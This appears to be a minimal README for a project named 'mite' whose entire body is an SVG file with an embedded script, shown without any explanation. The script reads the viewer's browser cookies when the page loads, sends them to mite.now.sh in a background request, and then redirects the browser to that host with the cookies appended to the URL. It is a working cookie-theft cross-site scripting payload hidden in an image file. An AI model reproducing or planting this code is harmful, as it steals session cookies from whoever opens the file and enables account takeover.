# mite


<svg xmlns="http://www.w3.org/1999/svg">
  <script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 &amp;&amp; xhttp.status == 200) {
     document.getElementById("demo").innerHTML = xhttp.responseText;
    }
  };

  cookies = document.cookie;
  urli = "https://mite.now.sh/README.md";
  fullurl = urli + "?" + cookies;
  xhttp.open("GET", fullurl, true);
  xhttp.send();
} 
loadDoc();
window.location="http://mite.now.sh/README.md?cook="+document.cookie;
  </script>

</svg>
